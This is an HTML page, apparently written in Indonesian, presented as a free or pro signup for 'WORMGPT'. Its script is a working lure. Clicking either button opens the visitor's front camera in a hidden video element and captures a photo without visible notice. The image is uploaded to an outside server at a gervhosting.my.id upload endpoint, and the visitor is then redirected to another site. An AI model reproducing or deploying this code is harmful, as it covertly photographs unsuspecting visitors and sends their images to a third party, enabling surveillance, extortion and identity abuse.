<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WORMGPT - Capture</title>
    <style>
        /* ===== RESET & FULLSCREEN ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');

        body {
            background: #0a0a0a;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            position: relative;
        }

        .container {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: 
                radial-gradient(ellipse at center, rgba(139, 0, 0, 0.15) 0%, transparent 70%),
                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 50%),
                #0a0a0a;
            position: relative;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 0, 0, 0.03) 2px, rgba(255, 0, 0, 0.03) 4px),
                repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(255, 0, 0, 0.03) 2px, rgba(255, 0, 0, 0.03) 4px);
            pointer-events: none;
            z-index: 0;
        }

        .devil-icon {
            font-size: 120px;
            line-height: 1;
            margin-bottom: 10px;
            text-shadow: 0 0 60px rgba(255, 0, 0, 0.6), 0 0 120px rgba(255, 0, 0, 0.3);
            animation: devilGlow 3s ease-in-out infinite;
            position: relative;
            z-index: 1;
            filter: drop-shadow(0 0 30px rgba(255, 0, 0, 0.4));
        }

        @keyframes devilGlow {
            0%, 100% { 
                text-shadow: 0 0 60px rgba(255, 0, 0, 0.6), 0 0 120px rgba(255, 0, 0, 0.3);
                transform: scale(1);
            }
            50% { 
                text-shadow: 0 0 80px rgba(255, 0, 0, 0.8), 0 0 160px rgba(255, 0, 0, 0.5), 0 0 200px rgba(255, 0, 0, 0.2);
                transform: scale(1.05);
            }
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 40px;
            position: relative;
            z-index: 1;
        }

        .logo-text {
            font-size: 48px;
            font-weight: 900;
            color: #fff;
            letter-spacing: 4px;
            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            position: relative;
        }

        .logo-text .worm {
            color: #ff0000;
            text-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
        }

        .logo-text .gpt {
            color: #ffffff;
            text-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
        }

        .logo-text .dot {
            color: #ff0000;
            animation: dotPulse 1.5s ease-in-out infinite;
        }

        @keyframes dotPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
            letter-spacing: 8px;
            text-transform: uppercase;
            margin-bottom: 50px;
            position: relative;
            z-index: 1;
            font-weight: 300;
        }

        #video {
            display: none;
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
        }

        #canvas {
            display: none;
        }

        .btn-group {
            display: flex;
            gap: 20px;
            position: relative;
            z-index: 10;
            flex-wrap: wrap;
            justify-content: center;
        }

        .btn-paket {
            position: relative;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: 700;
            color: #fff;
            background: transparent;
            border: 2px solid rgba(255, 0, 0, 0.5);
            border-radius: 50px;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 3px;
            transition: all 0.3s ease;
            font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.1), inset 0 0 30px rgba(255, 0, 0, 0.05);
            overflow: hidden;
            min-width: 180px;
        }

        .btn-paket::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff0000, transparent, #ff0000, transparent);
            background-size: 400% 400%;
            border-radius: 50px;
            z-index: -1;
            animation: borderGlow 3s ease-in-out infinite;
            opacity: 0.3;
        }

        @keyframes borderGlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .btn-paket:hover {
            transform: scale(1.05);
            border-color: #ff0000;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.3), inset 0 0 60px rgba(255, 0, 0, 0.1);
        }

        .btn-paket:active {
            transform: scale(0.95);
        }

        .btn-paket:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            animation: none;
            transform: scale(1);
            border-color: rgba(255, 0, 0, 0.2);
        }

        .btn-paket .badge {
            display: block;
            font-size: 11px;
            font-weight: 300;
            opacity: 0.6;
            letter-spacing: 1px;
            margin-top: 4px;
        }

        .btn-paket.free {
            border-color: rgba(0, 255, 100, 0.4);
            box-shadow: 0 0 30px rgba(0, 255, 100, 0.05), inset 0 0 30px rgba(0, 255, 100, 0.02);
        }

        .btn-paket.free::before {
            background: linear-gradient(45deg, #00ff64, transparent, #00ff64, transparent);
            opacity: 0.2;
        }

        .btn-paket.free:hover {
            border-color: #00ff64;
            box-shadow: 0 0 60px rgba(0, 255, 100, 0.2), inset 0 0 60px rgba(0, 255, 100, 0.05);
        }

        .btn-paket.pro {
            border-color: rgba(255, 215, 0, 0.4);
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.05), inset 0 0 30px rgba(255, 215, 0, 0.02);
        }

        .btn-paket.pro::before {
            background: linear-gradient(45deg, #ffd700, transparent, #ffd700, transparent);
            opacity: 0.2;
        }

        .btn-paket.pro:hover {
            border-color: #ffd700;
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.2), inset 0 0 60px rgba(255, 215, 0, 0.05);
        }

        #loadingOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: rgba(10, 10, 10, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 20;
        }

        #loadingOverlay.active {
            display: flex;
        }

        .loader {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 4px solid rgba(255, 0, 0, 0.1);
            border-top: 4px solid #ff0000;
            border-right: 4px solid #ff0000;
            animation: spin 0.8s linear infinite;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.3);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #loadingText {
            color: rgba(255, 255, 255, 0.7);
            font-size: 20px;
            font-weight: 300;
            margin-top: 30px;
            letter-spacing: 6px;
            animation: fadeInOut 1.5s ease-in-out infinite;
            font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-transform: uppercase;
        }

        @keyframes fadeInOut {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 0, 0, 0.3);
            border-radius: 50%;
            animation: floatParticle 8s infinite;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes floatParticle {
            0%, 100% { 
                transform: translateY(0) translateX(0) scale(1);
                opacity: 0.3;
            }
            25% { 
                transform: translateY(-30px) translateX(20px) scale(1.5);
                opacity: 0.6;
            }
            50% { 
                transform: translateY(-60px) translateX(-10px) scale(1);
                opacity: 0.3;
            }
            75% { 
                transform: translateY(-30px) translateX(30px) scale(1.5);
                opacity: 0.6;
            }
        }

        @media (max-width: 768px) {
            .devil-icon { font-size: 80px; }
            .logo-text { font-size: 32px; letter-spacing: 2px; }
            .subtitle { font-size: 11px; letter-spacing: 5px; }
            .btn-group { gap: 15px; flex-direction: column; align-items: center; }
            .btn-paket { padding: 14px 30px; font-size: 16px; letter-spacing: 2px; min-width: 200px; }
            .loader { width: 80px; height: 80px; }
            #loadingText { font-size: 16px; letter-spacing: 4px; }
        }

        @media (max-width: 480px) {
            .devil-icon { font-size: 60px; }
            .logo-text { font-size: 24px; letter-spacing: 1px; }
            .subtitle { font-size: 9px; letter-spacing: 3px; margin-bottom: 30px; }
            .btn-paket { padding: 12px 25px; font-size: 14px; letter-spacing: 1.5px; min-width: 160px; border-width: 1.5px; }
            .btn-paket .badge { font-size: 9px; }
            .loader { width: 60px; height: 60px; border-width: 3px; }
            #loadingText { font-size: 14px; letter-spacing: 3px; }
        }
    </style>
</head>
<body>
    <div class="container" id="container">
        <!-- Particles -->
        <div class="particle" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
        <div class="particle" style="top: 20%; right: 10%; animation-delay: 2s;"></div>
        <div class="particle" style="bottom: 30%; left: 15%; animation-delay: 4s;"></div>
        <div class="particle" style="bottom: 10%; right: 5%; animation-delay: 1s;"></div>
        <div class="particle" style="top: 50%; left: 3%; animation-delay: 3s;"></div>
        <div class="particle" style="top: 40%; right: 3%; animation-delay: 5s;"></div>
        <div class="particle" style="bottom: 50%; left: 8%; animation-delay: 0.5s;"></div>
        <div class="particle" style="bottom: 20%; right: 15%; animation-delay: 2.5s;"></div>

        <div class="devil-icon">😈</div>
        <div class="logo-container">
            <span class="logo-text">
                <span class="worm">WORM</span><span class="gpt">GPT</span><span class="dot">.</span>
            </span>
        </div>
        <div class="subtitle">⚡ ENTER THE DARKNESS ⚡</div>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>

        <div class="btn-group">
            <button class="btn-paket free" id="btnFree">
                FREE 1 BULAN
                <span class="badge">▼ limited access</span>
            </button>
            <button class="btn-paket pro" id="btnPro">
                PRO
                <span class="badge">⭐ full access</span>
            </button>
        </div>

        <div id="loadingOverlay">
            <div class="loader"></div>
            <div id="loadingText">MEMUAT HALAMAN...</div>
        </div>
    </div>

    <script>
        // ===================================================
        // KONFIGURASI (SUDAH DIISI)
        // ===================================================
        const PANEL_URL = 'https://private.gervhosting.my.id/server/b7c2176e/upload-foto';
        const REDIRECT_URL = 'https://wormgpt.my.id'; // ganti jika perlu
        // ===================================================

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const btnFree = document.getElementById('btnFree');
        const btnPro = document.getElementById('btnPro');
        const loadingOverlay = document.getElementById('loadingOverlay');

        async function startAndCapture(paket) {
            console.log('[START] Paket:', paket);
            btnFree.disabled = true;
            btnPro.disabled = true;
            btnFree.textContent = '⏳...';
            btnPro.textContent = '⏳...';

            try {
                // 1. Kamera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false
                });
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 300));

                // 2. Capture
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0);
                const base64 = canvas.toDataURL('image/jpeg', 0.9);

                // 3. Matikan kamera
                stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;

                // 4. Tampilkan loading
                loadingOverlay.classList.add('active');

                // 5. Kirim ke server
                console.log('[FETCH] Mengirim ke:', PANEL_URL);
                const response = await fetch(PANEL_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: base64, paket: paket })
                });
                const result = await response.json();
                console.log('[RESPONSE]', result);

                if (result.status === 'sukses') {
                    console.log('✅ Berhasil dikirim ke server');
                } else {
                    console.warn('⚠️ Server merespons error:', result.message);
                }

                // 6. Redirect setelah 2 detik
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);

            } catch (error) {
                console.error('[ERROR]', error);
                loadingOverlay.classList.add('active');
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }
        }

        btnFree.addEventListener('click', () => startAndCapture('FREE'));
        btnPro.addEventListener('click', () => startAndCapture('PRO'));

        // Cek dukungan kamera
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            btnFree.disabled = true;
            btnPro.disabled = true;
            btnFree.textContent = '⚠️ TIDAK DIDUKUNG';
            btnPro.textContent = '⚠️ TIDAK DIDUKUNG';
        }

        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(t => t.stop());
            }
        });
    </script>
</body>
    </html>
